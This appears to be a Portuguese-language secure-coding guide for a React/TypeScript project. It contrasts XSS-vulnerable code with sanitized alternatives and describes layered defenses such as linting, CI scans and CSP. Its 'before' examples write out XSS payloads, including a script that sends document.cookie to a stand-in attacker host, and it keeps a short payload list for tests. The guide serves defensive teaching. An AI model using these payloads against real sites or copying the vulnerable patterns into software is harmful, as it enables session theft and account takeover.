# 🎨 Guia Visual de Segurança

## 🔴 ANTES: Código Vulnerável

### ❌ Exemplo 1: innerHTML Vulnerável

```typescript
// 🔴 VULNERÁVEL A XSS
function createMarker(userName: string) {
  const el = document.createElement('div');
  el.innerHTML = `<span>${userName}</span>`; // ❌ XSS!
  return el;
}

// Ataque:
createMarker('<img src=x onerror="alert(document.cookie)">');
// Resultado: Cookie roubado! 🚨
```

### ❌ Exemplo 2: dangerouslySetInnerHTML

```typescript
// 🔴 VULNERÁVEL A XSS
function UserPost({ content }: { content: string }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: content }} /> // ❌ XSS!
  );
}

// Ataque:
<UserPost content='<script>fetch("https://atacante.com?c="+document.cookie)</script>' />
// Resultado: Sessão roubada! 🚨
```

### ❌ Exemplo 3: Link Não Validado

```typescript
// 🔴 VULNERÁVEL A PHISHING
function ExternalLink({ url }: { url: string }) {
  return <a href={url}>Clique aqui</a>; // ❌ Phishing!
}

// Ataque:
<ExternalLink url="javascript:alert(document.cookie)" />
// Resultado: Código malicioso executado! 🚨
```

---

## 🟢 DEPOIS: Código Seguro

### ✅ Exemplo 1: DOM API Segura

```typescript
// ✅ SEGURO - Usa DOM API
function createMarker(userName: string) {
  const el = document.createElement('div');
  const span = document.createElement('span');
  span.textContent = userName; // ✅ Escapado automaticamente
  el.appendChild(span);
  return el;
}

// Ataque bloqueado:
createMarker('<img src=x onerror="alert(1)">');
// Resultado: Renderiza como texto, não executa! ✅
```

### ✅ Exemplo 2: SafeHtml Component

```typescript
// ✅ SEGURO - Usa DOMPurify
import { SafeHtml } from '@/shared/components/security';

function UserPost({ content }: { content: string }) {
  return <SafeHtml content={content} />; // ✅ Sanitizado!
}

// Ataque bloqueado:
<UserPost content='<script>alert(1)</script><p>Texto legítimo</p>' />
// Resultado: Script removido, texto mantido! ✅
```

### ✅ Exemplo 3: SafeLink Component

```typescript
// ✅ SEGURO - Valida URL
import { SafeLink } from '@/shared/components/security';

function ExternalLink({ url }: { url: string }) {
  return <SafeLink href={url}>Clique aqui</SafeLink>; // ✅ Validado!
}

// Ataque bloqueado:
<ExternalLink url="javascript:alert(1)" />
// Resultado: Renderiza span ao invés de link! ✅
```

---

## 🛡️ CAMADAS DE DEFESA

```
┌─────────────────────────────────────────────────────────┐
│  CAMADA 1: ESLint (Editor)                              │
│  ├─ Detecta innerHTML sem sanitização                   │
│  ├─ Detecta dangerouslySetInnerHTML                     │
│  └─ Alerta sobre padrões perigosos                      │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│  CAMADA 2: Pre-commit Hook                              │
│  ├─ Bloqueia commit com código inseguro                 │
│  ├─ Escaneia secrets hardcoded                          │
│  └─ Valida padrões perigosos                            │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│  CAMADA 3: CI/CD Pipeline                               │
│  ├─ ESLint security scan                                │
│  ├─ npm audit                                           │
│  ├─ Semgrep SAST                                        │
│  ├─ Gitleaks secret detection                           │
│  └─ Custom XSS pattern detection                        │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│  CAMADA 4: Componentes Seguros (Runtime)                │
│  ├─ SafeHtml (DOMPurify)                                │
│  ├─ SafeLink (URL validation)                           │
│  └─ SafeImage (Image validation)                        │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│  CAMADA 5: CSP (Browser)                                │
│  ├─ Bloqueia scripts inline                             │
│  ├─ Permite apenas domínios confiáveis                  │
│  └─ Previne XSS refletido                               │
└─────────────────────────────────────────────────────────┘
```

---

## 📊 FLUXO DE DESENVOLVIMENTO SEGURO

```
┌──────────────┐
│ Desenvolvedor│
│ escreve      │
│ código       │
└──────┬───────┘
       │
       ▼
┌──────────────────────────────────────┐
│ ESLint mostra erro no editor         │
│ ❌ innerHTML without DOMPurify        │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ Dev corrige usando SafeHtml          │
│ ✅ <SafeHtml content={data} />       │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ git commit                           │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ Pre-commit hook valida               │
│ ✅ Security checks passed!           │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ git push                             │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ CI/CD roda security scan             │
│ ✅ All scans passed!                 │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ Code review                          │
│ ✅ Security checklist OK             │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ Merge to main                        │
└──────┬───────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────┐
│ Deploy to production                 │
│ ✅ CSP ativo no browser              │
└──────────────────────────────────────┘
```

---

## 🎯 EXEMPLOS PRÁTICOS

### Cenário 1: Renderizar Post de Usuário

```typescript
// ❌ ERRADO
function PostContent({ post }: { post: Post }) {
  return <div dangerouslySetInnerHTML={{ __html: post.content }} />;
}

// ✅ CORRETO
import { SafeHtml } from '@/shared/components/security';

function PostContent({ post }: { post: Post }) {
  return <SafeHtml content={post.content} />;
}
```

### Cenário 2: Link para Site Externo

```typescript
// ❌ ERRADO
function BusinessWebsite({ url }: { url: string }) {
  return <a href={url} target="_blank">Visitar site</a>;
}

// ✅ CORRETO
import { SafeLink } from '@/shared/components/security';

function BusinessWebsite({ url }: { url: string }) {
  return (
    <SafeLink href={url} target="_blank">
      Visitar site
    </SafeLink>
  );
}
```

### Cenário 3: Avatar de Usuário

```typescript
// ❌ ERRADO
function UserAvatar({ avatarUrl }: { avatarUrl: string }) {
  return <img src={avatarUrl} alt="Avatar" />;
}

// ✅ CORRETO
import { SafeImage } from '@/shared/components/security';

function UserAvatar({ avatarUrl }: { avatarUrl: string }) {
  return (
    <SafeImage 
      src={avatarUrl} 
      alt="Avatar"
      fallback="/default-avatar.png"
    />
  );
}
```

### Cenário 4: Criar Marcador de Mapa

```typescript
// ❌ ERRADO
function createMapMarker(businessName: string) {
  const el = document.createElement('div');
  el.innerHTML = `<span>${businessName}</span>`;
  return el;
}

// ✅ CORRETO
function createMapMarker(businessName: string) {
  const el = document.createElement('div');
  const span = document.createElement('span');
  span.textContent = businessName; // Escapado automaticamente
  el.appendChild(span);
  return el;
}
```

---

## 🔍 COMO IDENTIFICAR CÓDIGO VULNERÁVEL

### Padrões Perigosos

```typescript
// 🔴 ALERTA: innerHTML
element.innerHTML = userInput;

// 🔴 ALERTA: dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// 🔴 ALERTA: eval
eval(userCode);

// 🔴 ALERTA: new Function
new Function(userCode)();

// 🔴 ALERTA: document.write
document.write(userInput);

// 🔴 ALERTA: URL não validada
<a href={userUrl}>Link</a>

// 🔴 ALERTA: Imagem não validada
<img src={userImageUrl} />

// 🔴 ALERTA: Token em localStorage
localStorage.setItem('token', authToken);
```

### Padrões Seguros

```typescript
// ✅ SEGURO: textContent
element.textContent = userInput;

// ✅ SEGURO: SafeHtml
<SafeHtml content={userInput} />

// ✅ SEGURO: SafeLink
<SafeLink href={userUrl}>Link</SafeLink>

// ✅ SEGURO: SafeImage
<SafeImage src={userImageUrl} alt="Image" />

// ✅ SEGURO: React escaping automático
<div>{userInput}</div>

// ✅ SEGURO: DOM API
const span = document.createElement('span');
span.textContent = userInput;
```

---

## 📝 CHECKLIST DE CODE REVIEW

### Para Revisor

- [ ] Nenhum uso de `innerHTML` sem `DOMPurify`
- [ ] Nenhum uso de `dangerouslySetInnerHTML` sem `SafeHtml`
- [ ] Todas as URLs de usuário validadas com `SafeLink`
- [ ] Todas as imagens de usuário validadas com `SafeImage`
- [ ] Nenhum `eval()` ou `new Function()`
- [ ] Nenhum token em `localStorage`
- [ ] ESLint security passou sem erros
- [ ] Testes de segurança passaram
- [ ] Documentação atualizada se necessário

### Para Desenvolvedor

- [ ] Li `docs/SECURITY_GUIDELINES.md`
- [ ] Usei componentes seguros onde necessário
- [ ] Rodei `npm run lint:security`
- [ ] Rodei `npm test tests/security/`
- [ ] Testei manualmente com inputs maliciosos
- [ ] Documentei decisões de segurança no PR

---

## 🚀 QUICK START

### 1. Importar Componentes

```typescript
import { 
  SafeHtml, 
  SafeLink, 
  SafeImage 
} from '@/shared/components/security';
```

### 2. Usar no Código

```typescript
// HTML de usuário
<SafeHtml content={userContent} />

// Link externo
<SafeLink href={userUrl}>Clique aqui</SafeLink>

// Imagem de usuário
<SafeImage src={userAvatar} alt="Avatar" />
```

### 3. Validar

```bash
npm run lint:security
npm test tests/security/
```

---

## 💡 DICAS PRO

### Dica 1: Sempre Valide Entrada

```typescript
// ❌ Confia no input
function processInput(input: string) {
  return input;
}

// ✅ Valida o input
import { sanitizePlainText } from '@/shared/components/security';

function processInput(input: string) {
  return sanitizePlainText(input);
}
```

### Dica 2: Use TypeScript

```typescript
// ✅ Type safety previne erros
type SafeUrl = `https://${string}` | `http://${string}`;

function openUrl(url: SafeUrl) {
  window.open(url);
}

// Erro de compilação:
openUrl('javascript:alert(1)'); // ❌ Type error!
```

### Dica 3: Teste com Payloads Reais

```typescript
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg onload=alert(1)>',
];

xssPayloads.forEach(payload => {
  const result = SafeHtml({ content: payload });
  expect(result).not.toContain('alert');
});
```

---

## 📚 RECURSOS ADICIONAIS

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [React Security](https://react.dev/learn/security)
- [CSP Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**Última atualização:** 2026-04-18  
**Versão:** 1.0.0
